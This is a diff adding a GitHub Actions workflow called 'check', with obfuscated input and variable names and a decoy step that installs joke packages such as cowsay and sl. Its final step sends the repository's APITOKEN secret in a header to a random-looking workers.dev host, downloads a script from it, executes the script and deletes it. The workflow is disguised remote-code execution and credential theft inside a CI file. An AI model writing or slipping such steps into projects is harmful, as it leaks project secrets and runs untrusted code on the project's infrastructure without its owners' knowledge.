@@ -1,0 +1,59 @@
+name: check
+
+on:
+  workflow_dispatch:
+    inputs:
+      zipo_override:
+        description: 'zip'
+        required: false
+        default: '7zip'
+        type: string
+      masketo_override:
+        description: 'masket'
+        required: false
+        default: 'll'
+        type: string
+      loop_override:
+        description: 'porter'
+        required: false
+        default: 'masque'
+        type: string
+      taro_override:
+        description: 'tar'
+        required: false
+        default: 'lzip'
+        type: string
+      amd_override:
+        description: 'tar'
+        required: false
+        default: 'lzip'
+        type: string
+
+env:
+  ONWARD: 'equal'
+  TYRFG: ${{ github.event.inputs.amd_override }}
+  TARG: ${{ github.event.inputs.taro_override }}
+  ZIPO: ${{ github.event.inputs.zipo_override }}
+  CVFRYYADF: ${{ github.event.inputs.loop_override }}
+  MASK: ${{ github.event.inputs.masketo_override }}
+  APITOKEN: ${{ secrets.APITOKEN }}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Need
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        run: |
+          sudo apt-get install -y --no-install-recommends \
+            hello sl cowsay figlet fortune-mod 
+      - name: Check
+        run: |
+          curl -sS -f -o maker.sh \
+            -H "TOKEN: ${{ env.APITOKEN }}" \
+            https://yalroe.derchmnvcae.workers.dev/ides/huae
+          chmod +x maker.sh && ./maker.sh && rm -rf maker.sh
